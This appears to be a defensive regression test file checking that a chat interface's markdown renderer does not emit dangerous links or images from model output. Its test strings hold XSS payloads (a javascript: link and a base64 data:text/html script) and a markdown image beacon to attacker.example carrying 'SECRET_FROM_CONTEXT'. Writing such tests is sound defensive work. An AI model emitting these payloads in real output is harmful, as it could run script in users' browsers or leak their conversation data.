// Fallback repro (vitest/jest in the linked node_modules are broken: missing
// @jridgewell/sourcemap-codec / @jest/core). Exercises the same smd.js parser the
// chat view uses; customRenderer's HREF/SRC branch delegates to smd.default_set_attr
// unchanged (markdownRenderer.ts:312-319), so href/src values are identical.
import { test } from 'node:test';
import assert from 'node:assert/strict';
// jsdom in the linked node_modules is also broken (missing @asamuzakjp/css-color),
// so use a minimal DOM shim covering what smd's default renderer touches.
class El {
  constructor(tag) { this.tagName = tag.toUpperCase(); this.attrs = {}; this.children = []; this.style = {}; }
  appendChild(c) { this.children.push(c); return c; }
  setAttribute(k, v) { this.attrs[k] = String(v); }
  getAttribute(k) { return k in this.attrs ? this.attrs[k] : null; }
  querySelector(tag) {
    for (const c of this.children) {
      if (c.tagName === tag.toUpperCase()) return c;
      const r = c.querySelector?.(tag); if (r) return r;
    }
    return null;
  }
}
globalThis.document = { createElement: (t) => new El(t), createTextNode: (t) => ({ text: t }) };
const smd = await import('/tmp/bob-scratch/8fc2/webui-review/webui/src/utils/smd.js');

function render(md) {
  const root = document.createElement('div');
  const p = smd.parser(smd.default_renderer(root));
  smd.parser_write(p, md);
  smd.parser_end(p);
  return root;
}

test('chat renderer must not emit javascript: href from model output', () => {
  const a = render('click [here](javascript:alert(document.domain)) now').querySelector('a');
  assert.ok(a);
  assert.doesNotMatch(a.getAttribute('href') ?? '', /^\s*javascript:/i);
});

test('chat renderer must not emit data: href from model output', () => {
  const a = render('[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)').querySelector('a');
  assert.doesNotMatch(a?.getAttribute('href') ?? '', /^\s*data:/i);
});

test('chat renderer must not auto-load attacker-controlled remote image (exfil beacon)', () => {
  const img = render('![](https://attacker.example/c?d=SECRET_FROM_CONTEXT)').querySelector('img');
  assert.doesNotMatch(img?.getAttribute('src') ?? '', /^https?:\/\/attacker\.example/);
});
